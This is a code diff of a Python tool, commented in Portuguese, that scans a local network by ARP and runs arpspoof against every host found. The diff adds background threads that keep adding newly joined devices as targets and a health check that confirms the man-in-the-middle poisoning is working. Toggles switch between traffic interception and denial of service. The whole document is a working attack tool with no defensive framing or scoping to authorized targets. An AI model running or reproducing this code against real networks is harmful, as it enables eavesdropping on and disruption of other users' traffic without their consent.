@@ -1,4 +1,3 @@
-
 import os
 import sys
 import subprocess
@@ -6,8 +5,15 @@ import socket
 import psutil
 import ipaddress
 import argparse
+import threading
+import time
+import netifaces
 from scapy.all import ARP, Ether, srp
 
+# Bloqueio de thread para proteger recursos compartilhados
+hosts_lock = threading.Lock()
+active_spoof_ips = set()
+running_processes = []
 
 # Verifica se está rodando como root
 if os.geteuid() != 0:
@@ -51,15 +57,8 @@ def get_lan_info():
 
 
 # Escaneia hosts ativos via ARP
-import ipaddress
-import socket
-import netifaces
-from scapy.all import ARP, Ether, srp
-
 def scan_hosts(interface, ip, netmask):
     network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
-
-    print(f"\nEscaneando rede: {network}\n")
 
     arp = ARP(pdst=str(network))
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -68,68 +67,138 @@ def scan_hosts(interface, ip, netmask):
     result = srp(packet, timeout=2, iface=interface, verbose=False)[0]
 
     hosts_up = []
-
     for sent, received in result:
         hosts_up.append(received.psrc)
 
     return hosts_up
 
 
-# Remove gateway e IP local
-def filter_hosts(hosts, interface):
-    # IP da máquina
-    my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
-
-    # Gateway padrão
-    gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
-
-    print(f"Removendo IP local: {my_ip}")
-    print(f"Removendo Gateway: {gateway}")
-
-    # Remove se estiver na lista
+# Remove gateway e IP local para evitar auto-ataque
+def filter_hosts(hosts, interface, my_ip, gateway):
     filtered_hosts = [ip for ip in hosts if ip != my_ip and ip != gateway]
-
     return filtered_hosts
 
 
-# Salva IPs no arquivo
+# Salva IPs no arquivo apenas para fins de log histórico
 def save_hosts_to_file(hosts, filename="ips.txt"):
-    with open(filename, "w") as file:
-        for ip in hosts:
-            file.write(ip + "\n")
+    with hosts_lock:
+        with open(filename, "w") as file:
+            for ip in hosts:
+                file.write(ip + "\n")
 
-    print(f"\nIPs salvos em {filename}")
 
-
-def arp_spoofing(lan_info, file_path ):
-    processes = []
-
-    with open(file_path, 'r') as file:
-        ips = file.read().splitlines()
-
-    for ip in ips:
-        proc = subprocess.Popen([
-            "arpspoof",
-            "-i", lan_info["interface"],
-            "-t", ip,
-            lan_info["gateway"]
-        ])
-        processes.append(proc)
-
-    print(f"{len(processes)} ataques iniciados...")
-
+# FUNÇÃO NOVA: Valida se o envenenamento ARP funcionou no IP alvo
+def verify_spoof_success(interface, target_ip, gateway_ip):
     try:
-        # Mantém o script rodando
-        for proc in processes:
-            proc.wait()
+        # Pega o MAC real da nossa própria máquina
+        my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
+        
+        # Envia uma requisição ARP diretamente para o IP do alvo perguntando pelo IP do Gateway
+        # Forçamos o envio Unicast diretamente ao MAC do alvo para não poluir a rede
+        arp_request = ARP(pdst=gateway_ip, psrc=lan_info_global["ip"])
+        
+        # Primeiro descobrimos o MAC atual do alvo para direcionar o teste
+        target_mac_req = ARP(pdst=target_ip)
+        ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        res = srp(ether_broadcast/target_mac_req, timeout=2, iface=interface, verbose=False)[0]
+        
+        if not res:
+            return "DESCONECTADO"
+            
+        target_mac = res[0][1].hwsrc
+        
+        # Envia o teste focado
+        ether_direct = Ether(dst=target_mac)
+        answer = srp(ether_direct/arp_request, timeout=2, iface=interface, verbose=False)[0]
+        
+        for sent, received in answer:
+            # Se o alvo responder associando o IP do gateway ao NOSSO MAC, o spoof funciona!
+            if received.psrc == gateway_ip:
+                if received.hwsrc.lower() == my_mac.lower():
+                    return "SUCESSO (MitM Ativo)"
+                else:
+                    return "FALHOU/PENDENTE (Alvo usa tabela real)"
+                    
+    except Exception:
+        return "ERRO DE CHECAGEM"
+    return "SEM RESPOSTA"
 
+
+# Thread contínua que busca novos dispositivos a cada X segundos
+def monitor_new_hosts(lan_info, interval=10):
+    global active_spoof_ips
+    print(f"[*] Monitor de novos hosts iniciado (Intervalo: {interval}s)...")
+    
+    while True:
+        time.sleep(interval)
+        try:
+            hosts = scan_hosts(
+                lan_info["interface"],
+                lan_info["ip"],
+                lan_info["netmask"]
+            )
+            
+            filtered = filter_hosts(hosts, lan_info["interface"], lan_info["ip"], lan_info["gateway"])
+            
+            with hosts_lock:
+                new_hosts = [ip for ip in filtered if ip not in active_spoof_ips]
+                
+                if new_hosts:
+                    print("\n[+] Novos hosts descobertos em tempo real:")
+                    for ip in new_hosts:
+                        print(f" -> {ip}")
+                        active_spoof_ips.add(ip)
+                    
+                    save_hosts_to_file(sorted(list(active_spoof_ips)))
+                    
+        except Exception as e:
+            print(f"Erro no monitor de hosts: {e}")
+
+
+# NOVA THREAD: Avalia ciclicamente a eficiência do ataque contra os alvos
+def health_check_spoofing(lan_info, interval=8):
+    print(f"[*] Verificador de integridade do Spoofing ativo (Intervalo: {interval}s)...")
+    while True:
+        time.sleep(interval)
+        with hosts_lock:
+            targets = list(active_spoof_ips)
+            
+        if targets:
+            print("\n=== STATUS DO ATAQUE ARP (HEALTH CHECK) ===")
+            for ip in targets:
+                status = verify_spoof_success(lan_info["interface"], ip, lan_info["gateway"])
+                print(f" Alvo: {ip:<15} -> Status: {status}")
+            print("===========================================\n")
+
+
+# Gerencia dinamicamente os processos arpspoof
+def dynamic_arp_spoofing(lan_info):
+    global active_spoof_ips, running_processes
+    print("[*] Mecanismo dinâmico de Spoofing operacional.")
+    
+    try:
+        while True:
+            with hosts_lock:
+                current_targets = list(active_spoof_ips)
+            
+            for ip in current_targets:
+                if not any(proc.args[3] == ip for proc in running_processes if proc.poll() is None):
+                    print(f"[+] Iniciando comando arpspoof contra o alvo: {ip}")
+                    
+                    proc = subprocess.Popen([
+                        "arpspoof",
+                        "-i", lan_info["interface"],
+                        "-t", ip,
+                        lan_info["gateway"]
+                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    
+                    running_processes.append(proc)
+            
+            time.sleep(2)
+            
     except KeyboardInterrupt:
-        print("\nEncerrando ataques...")
+        pass
 
-        for proc in processes:
-            proc.terminate()
-
-        print("Finalizado.")
 
 def set_ip_forwarding(enable: bool):
     try:
@@ -137,9 +206,9 @@ def set_ip_forwarding(enable: bool):
             f.write("1" if enable else "0")
 
         if enable:
-            print("[+] IP Forwarding habilitado.")
+            print("[+] IP Forwarding HABILITADO (Modo Homem no Meio / MitM).")
         else:
-            print("[-] IP Forwarding desabilitado.")
+            print("[-] IP Forwarding DESABILITADO (Modo Negação de Serviço / DoS).")
 
     except Exception as e:
         print("Erro ao configurar IP Forwarding:", e)
@@ -147,63 +216,85 @@ def set_ip_forwarding(enable: bool):
 
 
 # MAIN
+lan_info_global = None
+
 def main():
-    parser = argparse.ArgumentParser(
-        description="Scanner + ARP Spoofing Tool"
-    )
-
-    parser.add_argument(
-        "--forward",
-        action="store_true",
-        help="Habilita IP Forwarding"
-    )
-
-    parser.add_argument(
-        "--no-forward",
-        action="store_true",
-        help="Desabilita IP Forwarding"
-    )
-
+    global active_spoof_ips, running_processes, lan_info_global
+    
+    parser = argparse.ArgumentParser(description="Scanner de Rede + ARP Spoofing Dinâmico")
+    parser.add_argument("--forward", action="store_true", help="Habilita IP Forwarding (Interceptação)")
+    parser.add_argument("--no-forward", action="store_true", help="Desabilita IP Forwarding (Ataque DoS)")
+    
     args = parser.parse_args()
 
-    # Configuração do IP forwarding
     if args.forward and args.no_forward:
-        print("Escolha apenas uma opção: --forward OU --no-forward")
+        print("Erro: Escolha apenas uma opção: --forward OU --no-forward")
         sys.exit(1)
 
     if args.forward:
         set_ip_forwarding(True)
-
-    elif args.no_forward:
+    else:
         set_ip_forwarding(False)
 
     lan_info = get_lan_info()
-
+    lan_info_global = lan_info
     if not lan_info:
-        print("Não foi possível identificar a LAN.")
+        print("Erro: Não foi possível mapear as propriedades da rede local.")
         return
 
-    print("Interface:", lan_info["interface"])
-    print("IP Local:", lan_info["ip"])
-    print("Gateway:", lan_info["gateway"])
+    print("\n=== INFORMAÇÕES DA LAN ===")
+    print("Interface Ativa: ", lan_info["interface"])
+    print("Seu IP Local:    ", lan_info["ip"])
+    print("Gateway/Roteador:", lan_info["gateway"])
+    print("==========================\n")
 
-    hosts = scan_hosts(
+    print("[*] Realizando varredura ARP inicial na rede...")
+    initial_hosts = scan_hosts(
         lan_info["interface"],
         lan_info["ip"],
         lan_info["netmask"]
     )
 
-    # Remove seu próprio IP
-    hosts = [ip for ip in hosts if ip != lan_info["ip"]]
+    valid_targets = filter_hosts(initial_hosts, lan_info["interface"], lan_info["ip"], lan_info["gateway"])
 
-    print("\nHosts ativos encontrados:")
-    for ip in hosts:
-        print(ip)
+    with hosts_lock:
+        active_spoof_ips = set(valid_targets)
 
-    save_hosts_to_file(hosts)
+    print(f"\n[+] {len(active_spoof_ips)} alvos iniciais qualificados encontrados.")
+    for ip in active_spoof_ips:
+        print(f" -> {ip}")
 
-    print("Starting SPOOF")
-    arp_spoofing(lan_info, file_path="ips.txt")
+    save_hosts_to_file(sorted(list(active_spoof_ips)))
+
+    # Thread 1: Monitor de novos dispositivos
+    monitor_thread = threading.Thread(
+        target=monitor_new_hosts,
+        args=(lan_info, 10),
+        daemon=True
+    )
+    monitor_thread.start()
+
+    # Thread 2: Verificador ativo de eficácia (Health Check)
+    health_thread = threading.Thread(
+        target=health_check_spoofing,
+        args=(lan_info, 8),
+        daemon=True
+    )
+    health_thread.start()
+
+    try:
+        dynamic_arp_spoofing(lan_info)
+    except KeyboardInterrupt:
+        print("\n\n[-] Interrupção detectada! Iniciando procedimentos de finalização...")
+    finally:
+        print(f"[*] Encerrando de forma segura {len(running_processes)} processos ativos do arpspoof...")
+        for proc in running_processes:
+            try:
+                proc.terminate()
+                proc.wait(timeout=1)
+            except Exception:
+                proc.kill()
+        print("[+] Concluído. Rede reestabelecida com sucesso.")
 
 
 if __name__ == "__main__":
